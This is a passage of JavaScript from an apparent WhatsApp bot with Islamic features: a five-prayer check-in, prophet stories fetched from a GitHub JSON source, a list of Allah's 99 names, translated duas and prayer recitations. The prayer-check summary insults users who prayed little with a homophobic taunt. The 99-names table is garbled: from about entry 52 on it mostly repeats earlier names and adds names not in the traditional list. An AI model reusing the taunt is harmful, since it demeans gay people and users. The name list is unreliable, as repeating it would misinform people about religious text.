      const totalYes = VeranBotInc.prayerResults.filter(result => result === 'yes').length;

      let ratingMessage = '';
      if (totalYes === 5) {
          ratingMessage = "*🌟 Mash'Allah Bro, Keep It Up! 🌟*";
      } else if (totalYes >= 3) {
          ratingMessage = "*👍 Next Time Don't Miss Any Prayer!*";
      } else {
          ratingMessage = "*😔 Didn't Offer Any Prayer = You're Gay*";
      }

      // Construct the final message
      let finalMessage = `
*📊 Namaz Check Summary:*

🕌 *Prayers Offered:* ${totalYes} out of 5

${ratingMessage}

*Thank you for answering all the prayers. May Allah bless you!* 🙏
      `;

      await VeranBotInc.sendText(m.chat, finalMessage);

      // Reset tracking after all prayers have been asked
      VeranBotInc.askedPrayers = [];
      VeranBotInc.prayerResults = [];
  }
}
break;

case 'yes':
case 'no': {
  // Initialize tracking arrays if not already done
  if (!VeranBotInc.askedPrayers) {
      VeranBotInc.askedPrayers = [];
  }
  if (!VeranBotInc.prayerResults) {
      VeranBotInc.prayerResults = [];
  }

  // Add the current prayer to the asked list and store the result
  const prayers = ['Fajr', 'Zuhr', 'Asr', 'Maghrib', 'Isha'];
  const currentPrayerIndex = VeranBotInc.askedPrayers.length;

  if (command === 'yes') {
      await VeranBotInc.sendText(m.chat, "*Mash'Allah 🌹*");
      VeranBotInc.prayerResults.push('yes');
  } else if (command === 'no') {
      await VeranBotInc.sendText(m.chat, '*Shame On You 😔*');
      VeranBotInc.prayerResults.push('no');
  }

  if (currentPrayerIndex < prayers.length) {
      VeranBotInc.askedPrayers.push(prayers[currentPrayerIndex]);

      // Move to the next prayer
      let nextPrayerIndex = VeranBotInc.askedPrayers.length;
      if (nextPrayerIndex < prayers.length) {
          let nextPrayer = prayers[nextPrayerIndex];

          let button = [{
              name: 'single_select',
              buttonParamsJson: {
                  title: `Did you pray ${nextPrayer}?`,
                  sections: [{
                      title: `${nextPrayer.toUpperCase()} PRAYER`,
                      rows: [
                          { title: 'Yes', description: `I have prayed ${nextPrayer}`, id: `${prefix} yes ${nextPrayer.toLowerCase()}` },
                          { title: 'No', description: `I haven't prayed ${nextPrayer}`, id: `${prefix} no ${nextPrayer.toLowerCase()}` },
                      ]
                  }]
              }
          }];

          await VeranBotInc.sendButtonMsg(m.chat, `*Did you pray ${nextPrayer}?*`, null, '*Please choose:*', null, button, m);
      } else {
          // Calculate the results after the last prayer
          const totalYes = VeranBotInc.prayerResults.filter(result => result === 'yes').length;

          let ratingMessage = '';
          if (totalYes === 5) {
              ratingMessage = "*🌟 Mash'Allah Bro, Keep It Up! 🌟*";
          } else if (totalYes >= 3) {
              ratingMessage = "*👍 Next Time Don't Miss Any Prayer!*";
          } else {
              ratingMessage = "*😔 Didn't Offer Any Prayer = You're Gay*";
          }

          // Construct the final message
          let finalMessage = `
*📊 Namaz Check Summary:*

🕌 *Prayers Offered:* ${totalYes} out of 5

${ratingMessage}

*Thank you for answering all the prayers. May Allah bless you!* 🙏
          `;

          await VeranBotInc.sendText(m.chat, finalMessage);

          // Reset tracking after all prayers have been asked
          VeranBotInc.askedPrayers = [];
          VeranBotInc.prayerResults = [];
      }
  }
}
break;




case 'kisahnabi': {
  const prophets = [
      'adam', 'ayyub', 'daud', 'dzulkifli', 'harun', 'hud', 'ibrahim', 'idris', 
      'ilyas', 'ilyasa', 'isa', 'ishaq', 'ismail', 'luth', 'muhammad', 'musa', 
      'nuh', 'sholeh', 'sulaiman', 'syuaib', 'yahya', 'yaqub', 'yunus', 'yusuf', 'zakariya'
  ];

  if (!text) {
      let button = [{
          name: 'single_select',
          buttonParamsJson: {
              title: `Please select a prophet to read the story:`,
              sections: [{
                  title: 'Prophets List',
                  rows: prophets.map(nabi => ({
                      title: nabi.charAt(0).toUpperCase() + nabi.slice(1), // Capitalize the first letter
                      description: `Story of Prophet ${nabi.charAt(0).toUpperCase() + nabi.slice(1)}`,
                      id: `${prefix}kisahnabi ${nabi}`
                  }))
              }]
          }
      }];

      await VeranBotInc.sendButtonMsg(m.chat, '*Select a Prophet*', null, '*Choose one from the list below:*', null, button, m);
      return;
  }

  // If user selects a prophet, fetch the story
  try {
      let nabiName = text.toLowerCase();
      if (!prophets.includes(nabiName)) {
          return VeranBotInc.sendText(m.chat, "*Not Found*\n*📮 Tips :* Please select a valid prophet from the list.");
      }

      let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${nabiName}.json`);
      let kisah = await url.json();

      let hasil = `_*👳 Prophet :*_ ${kisah.name}\n`
                + `_*📅 Date of Birth :*_ ${kisah.thn_kelahiran}\n`
                + `_*📍 Place of Birth :*_ ${kisah.tmp}\n`
                + `_*📊 Age :*_ ${kisah.usia}\n\n`
                + `*— — — — — — — [ S T O R Y ] — — — — — — —*\n\n`
                + `${kisah.description}`;

      // Translate the story to English before sending
      let translatedResult = await translate(hasil, { to: 'en' }).catch(_ => null);

      if (translatedResult && translatedResult.text) {
          await VeranBotInc.sendText(m.chat, `${translatedResult.text}`);
      } else {
          await VeranBotInc.sendText(m.chat, `${hasil}`);
      }
  } catch (error) {
      await VeranBotInc.sendText(m.chat, "*Not Found*\n*📮 Tips :* Please try selecting a prophet from the list.");
  }
}
break;



case 'asmaulhusna': {
  const contoh = `*Asmaul Husna*`;
  const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`;

  const asmaulhusna = [
      { index: 1, latin: "Ar Rahman", arabic: "الرَّحْمَنُ", translation_id: "مطلق صفت رحمت والا", translation_en: "The All Beneficent" },
      { index: 2, latin: "Ar Rahiim", arabic: "الرَّحِيمُ", translation_id: "مطلق صفت شفقت والا", translation_en: "The Most Merciful" },
      { index: 3, latin: "Al Malik", arabic: "الْمَلِكُ", translation_id: "مطلق صفت حکمرانی والا", translation_en: "The King, The Sovereign" },
      { index: 4, latin: "Al Quddus", arabic: "الْقُدُّوسُ", translation_id: "مطلق صفت پاک", translation_en: "The Most Holy" },
      { index: 5, latin: "As Salaam", arabic: "السَّلاَمُ", translation_id: "مطلق صفت سلامتی والا", translation_en: "Peace and Blessing" },
      { index: 6, latin: "Al Mu’min", arabic: "الْمُؤْمِنُ", translation_id: "مطلق صفت امن دینے والا", translation_en: "The Guarantor" },
      { index: 7, latin: "Al Muhaimin", arabic: "الْمُهَيْمِنُ", translation_id: "مطلق صفت نگہبان", translation_en: "The Guardian, the Preserver" },
      { index: 8, latin: "Al ‘Aziiz", arabic: "الْعَزِيزُ", translation_id: "مطلق صفت عزت والا", translation_en: "The Almighty, the Self Sufficient" },
      { index: 9, latin: "Al Jabbar", arabic: "الْجَبَّارُ", translation_id: "مطلق صفت طاقت والا", translation_en: "The Powerful, the Irresistible" },
      { index: 10, latin: "Al Mutakabbir", arabic: "الْمُتَكَبِّرُ", translation_id: "مطلق صفت بڑائی والا", translation_en: "The Tremendous" },
      { index: 11, latin: "Al Khaliq", arabic: "الْخَالِقُ", translation_id: "مطلق صفت خالق", translation_en: "The Creator" },
      { index: 12, latin: "Al Baari’", arabic: "الْبَارِئُ", translation_id: "مطلق صفت بنانے والا", translation_en: "The Maker" },
      { index: 13, latin: "Al Mushawwir", arabic: "الْمُصَوِّرُ", translation_id: "مطلق صفت شکل دینے والا", translation_en: "The Fashioner of Forms" },
      { index: 14, latin: "Al Ghaffaar", arabic: "الْغَفَّارُ", translation_id: "مطلق صفت معاف کرنے والا", translation_en: "The Ever Forgiving" },
      { index: 15, latin: "Al Qahhaar", arabic: "الْقَهَّارُ", translation_id: "مطلق صفت قاہر", translation_en: "The All Compelling Subduer" },
      { index: 16, latin: "Al Wahhaab", arabic: "الْوَهَّابُ", translation_id: "مطلق صفت عطا کرنے والا", translation_en: "The Bestower" },
      { index: 17, latin: "Ar Razzaaq", arabic: "الرَّزَّاقُ", translation_id: "مطلق صفت رزق دینے والا", translation_en: "The Ever Providing" },
      { index: 18, latin: "Al Fattaah", arabic: "الْفَتَّاحُ", translation_id: "مطلق صفت رحمت کھولنے والا", translation_en: "The Opener, the Victory Giver" },
      { index: 19, latin: "Al ‘Aliim", arabic: "اَلْعَلِيْمُ", translation_id: "مطلق صفت عالم", translation_en: "The All Knowing, the Omniscient" },
      { index: 20, latin: "Al Qaabidh", arabic: "الْقَابِضُ", translation_id: "مطلق صفت تنگ کرنے والا", translation_en: "The Restrainer, the Straightener" },
      { index: 21, latin: "Al Baasith", arabic: "الْبَاسِطُ", translation_id: "مطلق صفت پھیلانے والا", translation_en: "The Expander, the Munificent" },
      { index: 22, latin: "Al Khaafidh", arabic: "الْخَافِضُ", translation_id: "مطلق صفت نیچا کرنے والا", translation_en: "The Abaser" },
      { index: 23, latin: "Ar Raafi’", arabic: "الرَّافِعُ", translation_id: "مطلق صفت اونچا کرنے والا", translation_en: "The Exalter" },
      { index: 24, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Giver of Honor" },
      { index: 25, latin: "Al Mudzil", arabic: "المُذِلُّ", translation_id: "مطلق صفت ذلت دینے والا", translation_en: "The Giver of Dishonor" },
      { index: 26, latin: "Al Samii’", arabic: "السَّمِيعُ", translation_id: "مطلق صفت سننے والا", translation_en: "The All Hearing" },
      { index: 27, latin: "Al Bashiir", arabic: "الْبَصِيرُ", translation_id: "مطلق صفت دیکھنے والا", translation_en: "The All Seeing" },
      { index: 28, latin: "Al Hakam", arabic: "الْحَكَمُ", translation_id: "مطلق صفت فیصلے والا", translation_en: "The Judge, the Arbitrator" },
      { index: 29, latin: "Al ‘Adl", arabic: "الْعَدْلُ", translation_id: "مطلق صفت عدل", translation_en: "The Utterly Just" },
      { index: 30, latin: "Al Lathiif", arabic: "اللَّطِيفُ", translation_id: "مطلق صفت نرمی والا", translation_en: "The Subtly Kind" },
      { index: 31, latin: "Al Khabiir", arabic: "الْخَبِيرُ", translation_id: "مطلق صفت رازوں کا جاننے والا", translation_en: "The All Aware" },
      { index: 32, latin: "Al Haliim", arabic: "الْحَلِيمُ", translation_id: "مطلق صفت بردبار", translation_en: "The Forbearing, the Indulgent" },
      { index: 33, latin: "Al ‘Azhiim", arabic: "الْعَظِيمُ", translation_id: "مطلق صفت عظیم", translation_en: "The Magnificent, the Infinite" },
      { index: 34, latin: "Al Ghafuur", arabic: "الْغَفُورُ", translation_id: "مطلق صفت معاف کرنے والا", translation_en: "The All Forgiving" },
      { index: 35, latin: "As Syakuur", arabic: "الشَّكُورُ", translation_id: "مطلق صفت شکرگزار", translation_en: "The Grateful" },
      { index: 36, latin: "Al ‘Aliy", arabic: "الْعَلِيُّ", translation_id: "مطلق صفت اعلی", translation_en: "The Sublimely Exalted" },
      { index: 37, latin: "Al Kabir", arabic: "الْكَبِيرُ", translation_id: "مطلق صفت بڑا", translation_en: "The All Great" },
      { index: 38, latin: "Al Hafiz", arabic: "الْحَفِيظُ", translation_id: "مطلق صفت محفوظ کرنے والا", translation_en: "The Preserver" },
      { index: 39, latin: "Al Muqit", arabic: "الْمُقيِت", translation_id: "مطلق صفت نگہبان", translation_en: "The Sustainer" },
      { index: 40, latin: "Al Hasib", arabic: "الْحَسِيبُ", translation_id: "مطلق صفت حساب لینے والا", translation_en: "The Reckoner" },
      { index: 41, latin: "Al Jaliil", arabic: "الْجَلِيلُ", translation_id: "مطلق صفت جلال والا", translation_en: "The Majestic" },
      { index: 42, latin: "Al Kariim", arabic: "الْكَرِيمُ", translation_id: "مطلق صفت کرم والا", translation_en: "The Generous, the Esteemed" },
      { index: 43, latin: "Al Raqiib", arabic: "الرَّقِيبُ", translation_id: "مطلق صفت نگران", translation_en: "The Watchful" },
      { index: 44, latin: "Al Mujiib", arabic: "الْمُجِيبُ", translation_id: "مطلق صفت جواب دینے والا", translation_en: "The Responsive" },
      { index: 45, latin: "Al Wasi’", arabic: "الْوَاسِعُ", translation_id: "مطلق صفت وسعت والا", translation_en: "The All-Encompassing" },
      { index: 46, latin: "Al Haadi", arabic: "الْهَادِي", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Guide" },
      { index: 47, latin: "Al Baadi’", arabic: "الْبَادِعُ", translation_id: "مطلق صفت سب سے پہلا", translation_en: "The Incomparable" },
      { index: 48, latin: "Al Baaqi", arabic: "الْبَاقِي", translation_id: "مطلق صفت باقی", translation_en: "The Everlasting" },
      { index: 49, latin: "Al Waarith", arabic: "الْوَارِثُ", translation_id: "مطلق صفت وارث", translation_en: "The Inheritor" },
      { index: 50, latin: "Ar Rashid", arabic: "الرَّشِيدُ", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Righteous Teacher" },
      { index: 51, latin: "As Sabur", arabic: "الصَّبُورُ", translation_id: "مطلق صفت صابر", translation_en: "The Patient" },
      { index: 52, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Giver of Honor" },
      { index: 53, latin: "Al Muthir", arabic: "الْمُثِيرُ", translation_id: "مطلق صفت جوش دلانے والا", translation_en: "The Infuser of Enthusiasm" },
      { index: 54, latin: "Al Mu’min", arabic: "الْمُؤْمِنُ", translation_id: "مطلق صفت ایمان دینے والا", translation_en: "The Giver of Faith" },
      { index: 55, latin: "Al Qariib", arabic: "الْقَرِيبُ", translation_id: "مطلق صفت قریب", translation_en: "The Near" },
      { index: 56, latin: "Al Mu’min", arabic: "الْمُؤْمِنُ", translation_id: "مطلق صفت ایمان دینے والا", translation_en: "The Giver of Faith" },
      { index: 57, latin: "Al Qawiyy", arabic: "الْقَوِيُّ", translation_id: "مطلق صفت طاقتور", translation_en: "The All-Strong" },
      { index: 58, latin: "Al Qadeer", arabic: "الْقَادِرُ", translation_id: "مطلق صفت قادر", translation_en: "The Omnipotent" },
      { index: 59, latin: "Al Haqq", arabic: "الْحَقُّ", translation_id: "مطلق صفت حق", translation_en: "The Absolute Truth" },
      { index: 60, latin: "Al Hakeem", arabic: "الْحَكِيمُ", translation_id: "مطلق صفت حکیم", translation_en: "The All Wise" },
      { index: 61, latin: "Al Wahhab", arabic: "الْوَهَّابُ", translation_id: "مطلق صفت عطا کرنے والا", translation_en: "The Supreme Bestower" },
      { index: 62, latin: "Al Jalil", arabic: "الْجَلِيلُ", translation_id: "مطلق صفت جلال والا", translation_en: "The Majestic" },
      { index: 63, latin: "Al Karim", arabic: "الْكَرِيمُ", translation_id: "مطلق صفت کرم والا", translation_en: "The Generous" },
      { index: 64, latin: "Al Khabeer", arabic: "الْخَبِيرُ", translation_id: "مطلق صفت باخبر", translation_en: "The All-Aware" },
      { index: 65, latin: "Al Latif", arabic: "الْلَطِيفُ", translation_id: "مطلق صفت لطیف", translation_en: "The Subtle" },
      { index: 66, latin: "Al Qabid", arabic: "الْقَابِضُ", translation_id: "مطلق صفت تنگ کرنے والا", translation_en: "The Withholder" },
      { index: 67, latin: "Al Basit", arabic: "الْبَاسِطُ", translation_id: "مطلق صفت پھیلانے والا", translation_en: "The Extender" },
      { index: 68, latin: "Al Khafid", arabic: "الْخَافِضُ", translation_id: "مطلق صفت کم کرنے والا", translation_en: "The Reducer" },
      { index: 69, latin: "Ar Rafi", arabic: "الرَّافِعُ", translation_id: "مطلق صفت بلند کرنے والا", translation_en: "The Exalter" },
      { index: 70, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Honor Giver" },
      { index: 71, latin: "Al Mudzil", arabic: "الْمُذِلُّ", translation_id: "مطلق صفت ذلت دینے والا", translation_en: "The Dishonor Giver" },
      { index: 72, latin: "Al Sami", arabic: "الْسَمِيعُ", translation_id: "مطلق صفت سننے والا", translation_en: "The All-Hearing" },
      { index: 73, latin: "Al Baseer", arabic: "الْبَصِيرُ", translation_id: "مطلق صفت دیکھنے والا", translation_en: "The All-Seeing" },
      { index: 74, latin: "Al Hakam", arabic: "الْحَكَمُ", translation_id: "مطلق صفت حکمران", translation_en: "The Judge" },
      { index: 75, latin: "Al Adl", arabic: "الْعَدْلُ", translation_id: "مطلق صفت انصاف کرنے والا", translation_en: "The Just" },
      { index: 76, latin: "Al Latif", arabic: "الْلَطِيفُ", translation_id: "مطلق صفت نرمی والا", translation_en: "The Subtle" },
      { index: 77, latin: "Al Khabir", arabic: "الْخَبِيرُ", translation_id: "مطلق صفت باخبر", translation_en: "The All-Aware" },
      { index: 78, latin: "Al Halim", arabic: "الْحَلِيمُ", translation_id: "مطلق صفت بردبار", translation_en: "The Forbearing" },
      { index: 79, latin: "Al Azim", arabic: "الْعَظِيمُ", translation_id: "مطلق صفت عظیم", translation_en: "The Magnificent" },
      { index: 80, latin: "Al Ghafur", arabic: "الْغَفُورُ", translation_id: "مطلق صفت معاف کرنے والا", translation_en: "The Forgiving" },
      { index: 81, latin: "Ash Shakur", arabic: "الْشَاكُورُ", translation_id: "مطلق صفت شکرگزار", translation_en: "The Appreciative" },
      { index: 82, latin: "Al Ali", arabic: "الْعَلِيُّ", translation_id: "مطلق صفت اعلی", translation_en: "The Most High" },
      { index: 83, latin: "Al Kabir", arabic: "الْكَبِيرُ", translation_id: "مطلق صفت بڑا", translation_en: "The Great" },
      { index: 84, latin: "Al Hafiz", arabic: "الْحَفِيظُ", translation_id: "مطلق صفت محفوظ کرنے والا", translation_en: "The Preserver" },
      { index: 85, latin: "Al Muqit", arabic: "الْمُقيِت", translation_id: "مطلق صفت خوراک دینے والا", translation_en: "The Sustainer" },
      { index: 86, latin: "Al Hasib", arabic: "الْحَسِيبُ", translation_id: "مطلق صفت حساب لینے والا", translation_en: "The Reckoner" },
      { index: 87, latin: "Al Jalil", arabic: "الْجَلِيلُ", translation_id: "مطلق صفت جلال والا", translation_en: "The Majestic" },
      { index: 88, latin: "Al Karim", arabic: "الْكَرِيمُ", translation_id: "مطلق صفت کرم والا", translation_en: "The Generous" },
      { index: 89, latin: "Al Raqib", arabic: "الرَّقِيبُ", translation_id: "مطلق صفت نگران", translation_en: "The Watchful" },
      { index: 90, latin: "Al Mujib", arabic: "الْمُجِيبُ", translation_id: "مطلق صفت جواب دینے والا", translation_en: "The Responsive" },
      { index: 91, latin: "Al Wasi'", arabic: "الْوَاسِعُ", translation_id: "مطلق صفت وسعت والا", translation_en: "The All-Encompassing" },
      { index: 92, latin: "Al Haadi", arabic: "الْهَادِي", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Guide" },
      { index: 93, latin: "Al Baadi'", arabic: "الْبَادِعُ", translation_id: "مطلق صفت سب سے پہلا", translation_en: "The Incomparable" },
      { index: 94, latin: "Al Baqi", arabic: "الْبَاقِي", translation_id: "مطلق صفت باقی", translation_en: "The Everlasting" },
      { index: 95, latin: "Al Warith", arabic: "الْوَارِثُ", translation_id: "مطلق صفت وارث", translation_en: "The Inheritor" },
      { index: 96, latin: "Ar Rashid", arabic: "الرَّشِيدُ", translation_id: "مطلق صفت ہدایت دینے والا", translation_en: "The Righteous Teacher" },
      { index: 97, latin: "As Sabur", arabic: "الصَّبُورُ", translation_id: "مطلق صفت صابر", translation_en: "The Patient" },
      { index: 98, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Giver of Honor" },
      { index: 99, latin: "Al Muthir", arabic: "الْمُثِيرُ", translation_id: "مطلق صفت جوش دلانے والا", translation_en: "The Infuser of Enthusiasm" }
  ];

  const result = asmaulhusna.map(a => `\n${a.index}. ${a.latin}: ${a.translation_en} (${a.translation_id})\n   Arabic: ${a.arabic}\n   `).join("");
  await VeranBotInc.sendText(m.chat, contoh + anjuran + result);
}
  break

  case 'duas': {
    if (!q) return replygcveran(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id>*\n*${prefix + command} en*`);

    // Read and parse the JSON file
    let { result } = JSON.parse(fs.readFileSync('./lib/tahlil.json', 'utf-8'));

    // Extract language code from command arguments
    let lang = args[0] || 'en';

    // Translate and map the result to create captions
    let caption = await Promise.all(result.map(async (v, i) => {
        try {
            // Translate title and translation to the specified language
            let translatedTitleResponse = await translate(v.title, { to: lang, autoCorrect: true }).catch(err => {
                console.error(`Error translating title: ${err}`);
                return { text: v.title };
            });
            let translatedTitle = translatedTitleResponse.text || v.title;

            let translatedTranslationResponse = await translate(v.translation, { to: lang, autoCorrect: true }).catch(err => {
                console.error(`Error translating translation: ${err}`);
                return { text: v.translation };
            });
            let translatedTranslation = translatedTranslationResponse.text || v.translation;

            return `
*${i + 1}.* ${translatedTitle}

❃ Arabic :
${v.arabic}

❃ Translate :
${translatedTranslation}
`.trim();
        } catch (error) {
            console.error(`Error translating text: ${error}`);
            return `BB
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim();
        }
    })).then(captions => captions.join('\n\n'));

    // Prepare and send the reply using your bot's method
    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: caption
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
                        }],
                    }), 
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '100000000000000000@newsletter',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break




case 'namaz': {
  const namazData = {
      "result": [
         {
            "id": 1,
            "name": "Opening Takbir",
            "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
            "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil 'aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
            "translation": "Allah is the Greatest, with the greatest greatness. All praise is due to Allah in abundance. Glory be to Allah in the morning and evening. Indeed, I direct my face to Allah who created the heavens and the earth, being upright and not of those who associate others with Him. Indeed, my prayer, my rites of worship, my life, and my death are for Allah, Lord of the Worlds. There is no partner for Him. And with this, I am commanded, and I am the first of the Muslims."
        },
        {
            "id": 2,
            "name": "Al-Fatihah",
            "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
            "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an’amta alaihim ghairil maghduubi alaihim waladhaalin",
            "translation": "1. In the name of Allah, the Most Gracious, the Most Merciful, 2. Praise be to Allah, Lord of the Worlds, 3. The Most Gracious, the Most Merciful, 4. Master of the Day of Judgment, 5. You alone we worship, and You alone we ask for help, 6. Guide us to the straight path, 7. The path of those who have received Your grace; not the path of those who have brought down wrath upon themselves, nor of those who have gone astray."
        },
        {
            "id": 3,
            "name": "Bowing (Ruku)",
            "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
            "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
            "translation": "Glory is to my Lord, the Most Great, and praise be to Him."
        },
        {
            "id": 4,
            "name": "Prostration (Sujud)",
            "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
            "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
            "translation": "Glory is to my Lord, the Most High, and praise be to Him."
        },
        {
            "id": 5,
            "name": "Sitting Between Two Prostrations",
            "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
            "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
            "translation": "O Allah, forgive my sins, have mercy on me, and remedy my shortcomings. Elevate my status, provide for me, guide me, grant me health, and pardon me."
        },
        {
            "id": 6,
            "name": "Sitting for the Initial Tashahhud",
            "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
            "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
            "translation": "All greetings, blessings, prayers, and good things are for Allah. Peace be upon you, O Prophet, and the mercy and blessings of Allah. Peace be upon us and upon the righteous servants of Allah. I bear witness that there is no deity except Allah, and I bear witness that Muhammad is the Messenger of Allah. O Allah, send blessings upon our master Muhammad."
        },
        {
            "id": 7,
            "name": "Sitting for the Final Tashahhud",
            "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
            "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
